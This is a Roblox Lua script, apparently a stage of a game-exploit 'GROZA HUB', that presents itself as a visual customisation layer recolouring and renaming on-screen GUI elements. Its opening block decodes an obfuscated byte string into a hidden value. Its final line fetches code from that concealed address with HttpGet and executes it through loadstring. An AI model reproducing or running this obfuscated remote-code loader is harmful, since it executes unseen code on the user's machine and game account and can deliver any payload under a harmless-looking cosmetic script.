
--[[ STAGE 2: VISUAL CORE ]]
local BWfDauO52yBA7ETm5O1="\007\000\030\101\031\038\037\030\053\067\057\075\071\081\066\160\102\100\097\114\185\098\122\122\131\141\215\128\154\156\144\240\171\178\177\170\193\207\197\215\211\221\206\044\214\237\247\226\069\008\015\008\090\005\036\030\020\051\055\048\038\060\047\054\074\064\090\075\099\102\180\096\111\103\199\204\190\122\126\135\140\165"local XYnHCuPQcHJiahA4k3Aj3=81 local hwjdXjYRCTyiKad=180 local h8q3W8XMOyOW_bxW=0 local gxDPbTCQEIlqToUPo=5 local rrHab67sdvFlpt8wJV=30 local Rz58_W9MPcKBmGzitC1bdg=true local PdCbXLnxMA21=bit32 and bit32.bxor if not PdCbXLnxMA21 then PdCbXLnxMA21=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local qGFKZMKBqvGn={}for ovtBexjbBDQPqxeLqWW=1,#BWfDauO52yBA7ETm5O1 do local P4oPFgWZXiFmacbocRp=string.byte(BWfDauO52yBA7ETm5O1,ovtBexjbBDQPqxeLqWW)local CRPsNtzYcEYNi_De=(hwjdXjYRCTyiKad+(ovtBexjbBDQPqxeLqWW*gxDPbTCQEIlqToUPo)+rrHab67sdvFlpt8wJV)%256 if h8q3W8XMOyOW_bxW==0 then P4oPFgWZXiFmacbocRp=(P4oPFgWZXiFmacbocRp-CRPsNtzYcEYNi_De)%256 qGFKZMKBqvGn[ovtBexjbBDQPqxeLqWW]=string.char(PdCbXLnxMA21(P4oPFgWZXiFmacbocRp,XYnHCuPQcHJiahA4k3Aj3))else P4oPFgWZXiFmacbocRp=PdCbXLnxMA21(P4oPFgWZXiFmacbocRp,XYnHCuPQcHJiahA4k3Aj3)qGFKZMKBqvGn[ovtBexjbBDQPqxeLqWW]=string.char((P4oPFgWZXiFmacbocRp-CRPsNtzYcEYNi_De)%256)end end local Qk3KMoGTl19cc=table.concat(qGFKZMKBqvGn)if Rz58_W9MPcKBmGzitC1bdg then Qk3KMoGTl19cc=string.reverse(Qk3KMoGTl19cc)end local vlPn19YnewXatU=Qk3KMoGTl19cc
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(vlPn19YnewXatU))()
